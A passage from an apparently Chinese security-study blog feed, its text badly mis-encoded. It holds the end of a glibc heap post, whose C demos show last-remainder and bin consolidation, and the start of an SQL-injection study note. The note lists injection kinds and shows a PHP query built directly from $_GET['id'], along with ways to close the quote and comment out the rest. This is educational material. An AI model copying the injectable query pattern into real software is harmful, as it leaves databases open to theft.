class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>é‡Šæ”¾p1å’Œp</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201216142837517.png" alt="image-20201216142837517"></p>
<p>ä¸‹é¢æˆ‘ä»¬çŒœæƒ³ä¼šå‘é€ä»€ä¹ˆ?</p>
<p>ç”±äºåˆ†é…chunkè¾ƒå¤§ æ‰€ä»¥æˆ‘ä»¬ä¼šè§¦å‘consolidate è¿™æ—¶ä¸¤ä¸ªfastchunkå°±ä¼šè¿›å…¥unsortedbinä¸­ æ ¹æ®ä¸Šé¢è§„åˆ™ å®ƒä¸‹ä¸€æ­¥å°±ä¼šè¿›å…¥small bins</p>
<p>åˆå› ä¸ºå’Œtop chunkç›¸é‚» æ‰€ä»¥top chunkä¼šåˆå¹¶ </p>
<p>ç›´è§‚æ„Ÿè§‰å°±æ˜¯æˆ‘ä»¬è¦†ç›–äº†ä¹‹å‰çš„chunk</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201216143203315.png" alt="image-20201216143203315"></p>
</blockquote>
<h3 id="0x14-last-remainder"><a href="#0x14-last-remainder" class="headerlink" title="0x14 last remainder"></a>0x14 last remainder</h3><h4 id="1-å®šä¹‰"><a href="#1-å®šä¹‰" class="headerlink" title="1.å®šä¹‰"></a>1.å®šä¹‰</h4><ul>
<li>å¦‚æœåœ¨binsé“¾ä¸­å­˜åœ¨freechunkæ—¶ï¼Œå½“æˆ‘ä»¬å»mallocçš„æ—¶å€™ï¼Œmallocçš„è¯·æ±‚å¤§å°æ¯”freechunkçš„å¤§å°å°ï¼Œé‚£ä¹ˆarenaå°±ä¼šåˆ‡å‰²è¿™ä¸ªfreechunkç»™mallocä½¿ç”¨ï¼Œé‚£ä¹ˆåˆ‡å‰²ä¹‹åå‰©ä½™çš„chunkå°±<strong>è¢«ç§°ä¸ºâ€œlast remainderâ€</strong></li>
<li>å½“äº§ç”Ÿlast remainderä¹‹åï¼Œè¡¨ç¤ºarenaçš„<strong>malloc_stateç»“æ„ä½“ä¸­çš„last_remainderæˆå‘˜</strong>æŒ‡é’ˆå°±ä¼š<strong>è¢«åˆå§‹åŒ–</strong>ï¼Œå¹¶ä¸”æŒ‡å‘è¿™ä¸ªlast remainder</li>
</ul>
<h4 id="2-äº§ç”Ÿåœºæ™¯"><a href="#2-äº§ç”Ÿåœºæ™¯" class="headerlink" title="2.äº§ç”Ÿåœºæ™¯"></a>2.äº§ç”Ÿåœºæ™¯</h4><ul>
<li>mallocçš„æ—¶å€™ï¼Œä¸è®ºmallocçš„å¤§å°ï¼Œé¦–å…ˆä¼šå»æ£€æŸ¥æ¯ä¸ªbinsé“¾ï¼ˆå‡ºå»fastbinsé“¾ï¼‰æ˜¯å¦æœ‰ä¸mallocç›¸ç­‰å¤§å°çš„freechunkï¼Œå¦‚æœæ²¡æœ‰å°±å»æ£€æŸ¥binsé“¾ä¸­æ˜¯å¦æœ‰å¤§çš„freechunkå¯ä»¥åˆ‡å‰²ï¼Œå¦‚æœåˆ‡å‰²ï¼Œé‚£ä¹ˆå°±åˆ‡å‰²å¤§çš„freechunkï¼Œé‚£ä¹ˆåˆ‡å‰²ä¹‹åçš„chunkæˆä¸ºlast remainderï¼Œå¹¶ä¸”last remainderä¼šè¢«æ”¾å…¥åˆ°unsortedbinä¸­</li>
</ul>
<blockquote>
<p><strong>åˆ‡å‰²unsortedbinä¸­çš„å¤§chunkæ—¶ï¼š</strong></p>
<p>å½“unsortedbinæœ‰å¯¹åº”çš„freechunkå¯ä»¥ç»™mallocåˆ‡å‰²ä½¿ç”¨æ—¶ï¼Œunsortedbinä¼šå‘ç”Ÿä»¥ä¸‹æ­¥éª¤ï¼š</p>
<ul>
<li>â‘ å…ˆå°†è¿™äº›freechunkæ”¾ç½®åˆ°å¯¹åº”å¤§å°çš„binsé“¾ä¸Šï¼ˆæ”¾å…¥smallbinæˆ–largebinï¼‰</li>
<li>â‘¡æ”¾ç½®åˆ°å¯¹åº”çš„binsé“¾ä¸Šä¹‹åï¼Œåˆ‡å‰²æ­¤freechunk</li>
<li>â‘¢åˆ‡å‰²ä¹‹åä¼šäº§ç”Ÿlast remainderï¼Œå†å°†last remainderæ”¾åˆ°unsortedbinä¸Š</li>
</ul>
<p><strong>ä¾‹å¦‚ï¼š</strong></p>
<ul>
<li>æ­¤æ—¶ï¼Œunsortedbinæœ‰ä¸¤ä¸ª0x800çš„freechunk</li>
<li>æ­¤æ—¶ç”³è¯·ä¸€ä¸ª0x600çš„chunk</li>
<li>é‚£ä¹ˆunsortedbinä¼šå…ˆconsolidateï¼ŒæŠŠä¸¤ä¸ª0x800çš„freechunkå…ˆç§»åŠ¨åˆ°largebinä¸­</li>
<li>ç„¶åå†åˆ‡å‰²largebinçš„freechunkï¼Œå°†åˆ‡å‰²åä½™ç•™ä¸‹çš„0x200æ”¾å…¥unsortedbin</li>
</ul>
<p><strong>åˆ‡å‰²smallbinsã€largebinsä¸­çš„å¤§chunkæ—¶ï¼š</strong></p>
<ul>
<li>â‘ åˆ‡å‰²smallbinsæˆ–è€…largebinsä¸­çš„å¤§freechunkï¼Œäº§ç”Ÿlast remainder</li>
<li>â‘¡å°†last remainderæ”¾å…¥åˆ°unsortedbinä¸­</li>
</ul>
</blockquote>
<h4 id="3-last-remainderçš„consolidate"><a href="#3-last-remainderçš„consolidate" class="headerlink" title="3.last remainderçš„consolidate"></a>3.last remainderçš„consolidate</h4><p>å½“æˆ‘ä»¬åˆ‡å‰²ä¸€ä¸ªbinsé“¾ä¸­çš„å¤§chunkæ—¶äº§ç”Ÿlast reminaderæ—¶ï¼Œä¼šå‘ç”Ÿconsolidateï¼Œ<strong>ä½†æ˜¯æ­¤ç§consolidateä¸ä¼šå»æ•´ç†fastbinsä¸­çš„freechunkï¼ˆé‡ç‚¹ï¼‰</strong></p>
<h4 id="4-æ¼”ç¤ºä¸€-1"><a href="#4-æ¼”ç¤ºä¸€-1" class="headerlink" title="4.æ¼”ç¤ºä¸€"></a>4.æ¼”ç¤ºä¸€</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span> = <span class="number">0x120</span>;</span><br><span class="line">    <span class="keyword">void</span> *p = <span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *junk = <span class="built_in">malloc</span>(<span class="built_in">size</span>);  <span class="comment">//æ”¾ç½®é‡Šæ”¾på’Œqä¹‹åï¼Œpå’Œqå‘ç”Ÿåˆå¹¶</span></span><br><span class="line">    <span class="keyword">void</span> *q = <span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *r = <span class="built_in">malloc</span>(<span class="built_in">size</span>);   <span class="comment">//æ”¾ç½®é‡Šæ”¾qä¹‹åï¼Œqå’Œtopchunkå‘ç”Ÿåˆå¹¶</span></span><br><span class="line">	</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"p:0x%x\n"</span>,p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"q:0x%x\n"</span>,q);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"r:0x%x\n"</span>,r);</span><br><span class="line">	</span><br><span class="line">    <span class="built_in">strcpy</span>(p,<span class="string">"aaaaaaaabbbbbbbb"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(q,<span class="string">"ccccccccdddddddd"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(r,<span class="string">"eeeeeeeeffffffff"</span>);</span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//åªä¸ºäº†æ‰“æ–­ç‚¹ä½¿ç”¨ï¼Œæ— å…¶ä»–ä½œç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">	</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line">	</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>æ–­ç‚¹</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201216151435089.png" alt="image-20201216151435089"></p>
<p>é‡Šæ”¾på’Œq</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201216151556927.png" alt="image-20201216151556927"></p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201216151633713.png" alt="image-20201216151633713"></p>
<p>åˆ†é…0x90  </p>
<ul>
<li>é¦–å…ˆä¸¤ä¸ªunsortedbin chunkä¸­å¯ä»¥åˆ†å‰²åˆ°0x90é‚£ä¹ˆå°±ä¼šconsolidate å°†å…¶å…¨éƒ¨æ”¾å…¥smallbinsä¸­</li>
<li>ä¹‹ååˆ†å‰²å…¶ä¸­ä¸€éƒ¨åˆ† å¹¶å°†å‰©ä½™çš„æ”¾å…¥lastremainder</li>
</ul>
<p><img src="/2020/12/15/%E5%A0%86/image-20201216151705158.png" alt="image-20201216151705158"></p>
</blockquote>
<h4 id="5-æ¼”ç¤ºäºŒ-1"><a href="#5-æ¼”ç¤ºäºŒ-1" class="headerlink" title="5.æ¼”ç¤ºäºŒ"></a>5.æ¼”ç¤ºäºŒ</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x30</span>;</span><br><span class="line">    <span class="keyword">int</span> size2=<span class="number">0x200</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">int</span> *p2=<span class="built_in">malloc</span>(size2);</span><br><span class="line">    <span class="keyword">int</span> *temp=<span class="built_in">malloc</span>(<span class="built_in">size</span>); <span class="comment">//é˜²æ­¢p2å’Œp3éƒ½è¢«é‡Šæ”¾ä¹‹åï¼Œp2å’Œp3å‘ç”Ÿåˆå¹¶</span></span><br><span class="line">    <span class="keyword">int</span> *p3=<span class="built_in">malloc</span>(size2);</span><br><span class="line">    <span class="keyword">int</span> *temp2=<span class="built_in">malloc</span>(<span class="built_in">size</span>); <span class="comment">//é˜²æ­¢p3è¢«é‡Šæ”¾ä¹‹åä¸topchunkåˆå¹¶</span></span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//åªä¸ºæ‰“æ–­ç‚¹ä½¿ç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ç›´æ¥çœ‹é‡Šæ”¾p1 p2 p3</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201216155717972.png" alt="image-20201216155717972"></p>
<p>è¿™é‡Œç»§ç»­æƒ³ä¸€ä¸‹ä¸‹ä¸€æ­¥ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</p>
<ul>
<li>åˆ†é…å¤§å°0x100å¯ä»¥åˆ†é… é‚£ä¹ˆå°±ç›´æ¥è§¦å‘consolidateè¯´æ˜smallbinä¸­å°±ä¼šæœ‰free chunk</li>
<li>lastremainderä¼šæ”¾å…¥unsortedbinä¸­ï¼Œæ­¤å¤–fastfreechunkä¸ä¼šåˆå¹¶</li>
<li>é‚£ä¹ˆæˆ‘ä»¬å°±å¾—åˆ°äº†</li>
</ul>
<p><img src="/2020/12/15/%E5%A0%86/image-20201216160152597.png" alt="image-20201216160152597"></p>
</blockquote>
<h4 id="6-æ¼”ç¤ºä¸‰"><a href="#6-æ¼”ç¤ºä¸‰" class="headerlink" title="6.æ¼”ç¤ºä¸‰"></a>6.æ¼”ç¤ºä¸‰</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x300</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">int</span> *p2=<span class="built_in">malloc</span>(<span class="built_in">size</span>);  <span class="comment">//é˜²æ­¢p1è¢«é‡Šæ”¾ä¹‹åä¸topchunkåˆå¹¶</span></span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//ä¸ºäº†ç¨‹åºæ‰“æ–­ç‚¹ä½¿ç”¨ï¼Œæ— å…¶ä»–ä½œç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x700</span>);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ç›´æ¥çœ‹p1é‡Šæ”¾å</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201216160410739.png" alt="image-20201216160410739"></p>
<p>ä¹‹åä¼šåˆ†é…0x700è¯´æ˜è¦åˆ†é…è¾ƒå¤§çš„chunk æ­¤æ—¶ä¼šè¢«æ•´ç†åˆ°smallbinsä¸­</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201216160827250.png" alt="image-20201216160827250"></p>
<p>ç»§ç»­åˆ†é…0x200 lastremainderä¼šè¿›å…¥unsortedbinä¸­</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201216160910272.png" alt="image-20201216160910272"></p>
</blockquote>
<h4 id="7-æ¼”ç¤ºå››"><a href="#7-æ¼”ç¤ºå››" class="headerlink" title="7.æ¼”ç¤ºå››"></a>7.æ¼”ç¤ºå››</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x300</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> *temp=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="keyword">int</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//é˜²æ­¢p1é‡Šæ”¾å¹¶consolidateåˆ°smallbinsä¸­ä¹‹åï¼Œå†é‡Šæ”¾p2å¯¼è‡´p1å’Œp2åˆå¹¶ï¼Œåˆå¹¶ä¹‹ååˆè¢«æ”¾å…¥unsortedbinä¸­</span></span><br><span class="line">    <span class="keyword">int</span> *temp2=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x100</span>); </span><br><span class="line">    <span class="keyword">int</span> *p3=<span class="built_in">malloc</span>(<span class="built_in">size</span>);<span class="comment">//é˜²æ­¢p2è¢«é‡Šæ”¾ä¹‹åä¸topchunkåˆå¹¶</span></span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//ä¸ºäº†ç¨‹åºæ‰“æ–­ç‚¹ä½¿ç”¨ï¼Œæ— å…¶ä»–ä½œç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x700</span>);</span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(temp);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>å…ˆçœ‹å †ä¿¡æ¯</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201216164710877.png" alt="image-20201216164710877"></p>
<p>é‡Šæ”¾p1</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201216164747866.png" alt="image-20201216164747866"></p>
<p>åˆ†é…0x700 ç”±äºunsorted binä¸­çš„chunkä¸å¤Ÿ æ‰€ä»¥ç›´æ¥ä»top chunkä¸­åˆ†å‰²</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201216164913709.png" alt="image-20201216164913709"></p>
<p>free tmpå’Œp2</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201216165109899.png" alt="image-20201216165109899"></p>
<p>é‡ç‚¹æ¥çœ‹æœ€åä¸€æ­¥ è¿™é‡Œï¼Œmalloc(0x200)ï¼Œæ­¤æ—¶mallocä¼šåˆ‡å‰²smallbinsä¸­çš„p1ï¼Œå¹¶äº§ç”Ÿlast remainderï¼ˆ0x602250ï¼‰ï¼Œå¹¶æŠŠlast remainderæ”¾å…¥åˆ°unsortedbinä¸­ã€‚ç”±äºåˆ‡å‰²chunkå¹¶äº§ç”Ÿlast remainderä¼šå‘ç”Ÿconsolidateï¼Œæ‰€ä»¥unsortedbinä¸­çš„p2ä»unsortedbinä¸­æ•´ç†åˆ°smallbinsä¸­ï¼ˆç”±äºæ­¤ç§æƒ…å†µçš„consolidateä¸ä¼šæ•´ç†fastbinsä¸­çš„chunkï¼Œæ‰€ä»¥fastbinsä¸­çš„chunkä»ç„¶åœ¨fastbinsä¸­ï¼‰</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201216165224983.png" alt="image-20201216165224983"></p>
</blockquote>
]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>å †</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLæ³¨å…¥</title>
    <url>/2020/12/09/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>æˆ‘å°±å•çº¯æƒ³æŠŠè¿™äº›ä¸œè¥¿å­˜ä¸‹æ¥</p>
<h1 id="åŸºç¡€å­¦ä¹ "><a href="#åŸºç¡€å­¦ä¹ " class="headerlink" title="åŸºç¡€å­¦ä¹ "></a>åŸºç¡€å­¦ä¹ </h1><h2 id="1-SQLæ³¨å…¥çš„åˆ†ç±»"><a href="#1-SQLæ³¨å…¥çš„åˆ†ç±»" class="headerlink" title="1.SQLæ³¨å…¥çš„åˆ†ç±»"></a>1.SQLæ³¨å…¥çš„åˆ†ç±»</h2><ul>
<li><h3 id="åŸºäºä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„å“åº”"><a href="#åŸºäºä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„å“åº”" class="headerlink" title="åŸºäºä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„å“åº”"></a>åŸºäºä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„å“åº”</h3><ul>
<li><h4 id="åŸºäºé”™è¯¯çš„SQLæ³¨å…¥"><a href="#åŸºäºé”™è¯¯çš„SQLæ³¨å…¥" class="headerlink" title="åŸºäºé”™è¯¯çš„SQLæ³¨å…¥"></a>åŸºäºé”™è¯¯çš„SQLæ³¨å…¥</h4></li>
<li><h4 id="è”åˆæŸ¥è¯¢çš„ç±»å‹"><a href="#è”åˆæŸ¥è¯¢çš„ç±»å‹" class="headerlink" title="è”åˆæŸ¥è¯¢çš„ç±»å‹"></a>è”åˆæŸ¥è¯¢çš„ç±»å‹</h4></li>
<li><h4 id="å †æŸ¥è¯¢æ³¨å°„"><a href="#å †æŸ¥è¯¢æ³¨å°„" class="headerlink" title="å †æŸ¥è¯¢æ³¨å°„"></a>å †æŸ¥è¯¢æ³¨å°„</h4></li>
<li><h4 id="SQLç›²æ³¨"><a href="#SQLç›²æ³¨" class="headerlink" title="SQLç›²æ³¨"></a>SQLç›²æ³¨</h4><ul>
<li><h5 id="åŸºäºå¸ƒå°”SQLç›²æ³¨"><a href="#åŸºäºå¸ƒå°”SQLç›²æ³¨" class="headerlink" title="åŸºäºå¸ƒå°”SQLç›²æ³¨"></a>åŸºäºå¸ƒå°”SQLç›²æ³¨</h5></li>
<li><h5 id="åŸºäºæ—¶é—´çš„SQLç›²æ³¨"><a href="#åŸºäºæ—¶é—´çš„SQLç›²æ³¨" class="headerlink" title="åŸºäºæ—¶é—´çš„SQLç›²æ³¨"></a>åŸºäºæ—¶é—´çš„SQLç›²æ³¨</h5></li>
<li><h5 id="åŸºäºæŠ¥é”™çš„SQLç›²æ³¨"><a href="#åŸºäºæŠ¥é”™çš„SQLç›²æ³¨" class="headerlink" title="åŸºäºæŠ¥é”™çš„SQLç›²æ³¨"></a>åŸºäºæŠ¥é”™çš„SQLç›²æ³¨</h5></li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li><h3 id="åŸºäºå¦‚ä½•å¤„ç†è¾“å…¥çš„SQLæŸ¥è¯¢"><a href="#åŸºäºå¦‚ä½•å¤„ç†è¾“å…¥çš„SQLæŸ¥è¯¢" class="headerlink" title="åŸºäºå¦‚ä½•å¤„ç†è¾“å…¥çš„SQLæŸ¥è¯¢"></a>åŸºäºå¦‚ä½•å¤„ç†è¾“å…¥çš„SQLæŸ¥è¯¢</h3><ul>
<li><h5 id="åŸºäºå­—ç¬¦ä¸²"><a href="#åŸºäºå­—ç¬¦ä¸²" class="headerlink" title="åŸºäºå­—ç¬¦ä¸²"></a>åŸºäºå­—ç¬¦ä¸²</h5></li>
<li><h5 id="æ•°å­—æˆ–æ•´æ•°"><a href="#æ•°å­—æˆ–æ•´æ•°" class="headerlink" title="æ•°å­—æˆ–æ•´æ•°"></a>æ•°å­—æˆ–æ•´æ•°</h5></li>
</ul>
</li>
<li><h3 id="åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥"><a href="#åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥" class="headerlink" title="åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥"></a>åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥</h3><ul>
<li><h5 id="ä¸€é˜¶æ³¨å°„"><a href="#ä¸€é˜¶æ³¨å°„" class="headerlink" title="ä¸€é˜¶æ³¨å°„"></a>ä¸€é˜¶æ³¨å°„</h5></li>
<li><h5 id="äºŒé˜¶æ³¨å°„"><a href="#äºŒé˜¶æ³¨å°„" class="headerlink" title="äºŒé˜¶æ³¨å°„"></a>äºŒé˜¶æ³¨å°„</h5></li>
</ul>
</li>
<li><h3 id="åŸºäºæ³¨å…¥ç‚¹çš„ä½ç½®ä¸Šçš„"><a href="#åŸºäºæ³¨å…¥ç‚¹çš„ä½ç½®ä¸Šçš„" class="headerlink" title="åŸºäºæ³¨å…¥ç‚¹çš„ä½ç½®ä¸Šçš„"></a>åŸºäºæ³¨å…¥ç‚¹çš„ä½ç½®ä¸Šçš„</h3><ul>
<li><h5 id="é€šè¿‡ç”¨æˆ·è¾“å…¥çš„è¡¨å•åŸŸçš„æ³¨å°„"><a href="#é€šè¿‡ç”¨æˆ·è¾“å…¥çš„è¡¨å•åŸŸçš„æ³¨å°„" class="headerlink" title="é€šè¿‡ç”¨æˆ·è¾“å…¥çš„è¡¨å•åŸŸçš„æ³¨å°„"></a>é€šè¿‡ç”¨æˆ·è¾“å…¥çš„è¡¨å•åŸŸçš„æ³¨å°„</h5></li>
<li><h5 id="é€šè¿‡cookieæ³¨å°„"><a href="#é€šè¿‡cookieæ³¨å°„" class="headerlink" title="é€šè¿‡cookieæ³¨å°„"></a>é€šè¿‡cookieæ³¨å°„</h5></li>
<li><h5 id="é€šè¿‡æœåŠ¡å™¨å˜é‡"><a href="#é€šè¿‡æœåŠ¡å™¨å˜é‡" class="headerlink" title="é€šè¿‡æœåŠ¡å™¨å˜é‡"></a>é€šè¿‡æœåŠ¡å™¨å˜é‡</h5></li>
</ul>
</li>
</ul>
<h2 id="2-åŸºç¡€å‡½æ•°ä¸é€»è¾‘"><a href="#2-åŸºç¡€å‡½æ•°ä¸é€»è¾‘" class="headerlink" title="2.åŸºç¡€å‡½æ•°ä¸é€»è¾‘"></a>2.åŸºç¡€å‡½æ•°ä¸é€»è¾‘</h2><h3 id="1-åŸºç¡€å‡½æ•°"><a href="#1-åŸºç¡€å‡½æ•°" class="headerlink" title="1.åŸºç¡€å‡½æ•°"></a>1.åŸºç¡€å‡½æ•°</h3><p>â€‹    concat(str1,str2)   â€”â€”æ— åˆ†éš”è¿æ¥å­—ç¬¦ä¸²</p>
<p>â€‹    concat_ws(separator,str1,str2)   â€”â€”å«æœ‰åˆ†éš”ç¬¦è¿æ¥å­—ç¬¦ä¸²</p>
<p>â€‹    group_concat(str1,str2)  â€”â€”ä»¥é€—å·åˆ†éš”æ¯ä¸€æ¡æ•°æ®ï¼Œè¿æ¥ä¸€ä¸ªç»„çš„å­—ç¬¦ä¸²</p>
<h3 id="2-åŸºç¡€é€»è¾‘"><a href="#2-åŸºç¡€é€»è¾‘" class="headerlink" title="2.åŸºç¡€é€»è¾‘"></a>2.åŸºç¡€é€»è¾‘</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$sql=<span class="string">"select * from users where id='$id' limit 0,1"</span>;</span><br></pre></td></tr></table></figure>
<p>æ­¤å¤„è€ƒè™‘ä¸¤ä¸ªç‚¹ï¼Œä¸€ä¸ªæ˜¯é—­åˆå‰é¢ä½ çš„ â€˜ å¦ä¸€ä¸ªæ˜¯å¤„ç†åé¢çš„ â€˜ ï¼Œä¸€èˆ¬é‡‡ç”¨ä¸¤ç§æ€è·¯ï¼Œé—­åˆåé¢çš„å¼•å·æˆ–è€…æ³¨é‡Šæ‰ï¼Œæ³¨é‡Šæ‰é‡‡ç”¨â€”+ æˆ–è€… #ï¼ˆ%23ï¼‰ã€‚</p>
<p>limit ä»0å¼€å§‹ï¼Œè‡³å°‘1ä¸ªæ•°æ®</p>
<p>limit 10  è‡³å°‘10ä¸ªæ•°æ®</p>
<h3 id="3-unionæ“ä½œç¬¦çš„ç”¨æ³•"><a href="#3-unionæ“ä½œç¬¦çš„ç”¨æ³•" class="headerlink" title="3.unionæ“ä½œç¬¦çš„ç”¨æ³•"></a>3.unionæ“ä½œç¬¦çš„ç”¨æ³•</h3><p>unionæ“ä½œç¬¦ç”¨äºåˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ªselectè¯­å¥çš„ç»“æœé›†ã€‚ä½†æ³¨æ„çš„æ˜¯ï¼Œselectçš„è¯­å¥å¿…é¡»æœ‰ç›¸åŒæ•°é‡çš„åˆ—ï¼Œåˆ—ä¹Ÿæœ‰ç›¸åŒçš„ç±»å‹ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> column_names <span class="keyword">from</span> table_name1 <span class="keyword">union</span> <span class="keyword">select</span> column_names <span class="keyword">from</span> table_name2;</span><br></pre></td></tr></table></figure>
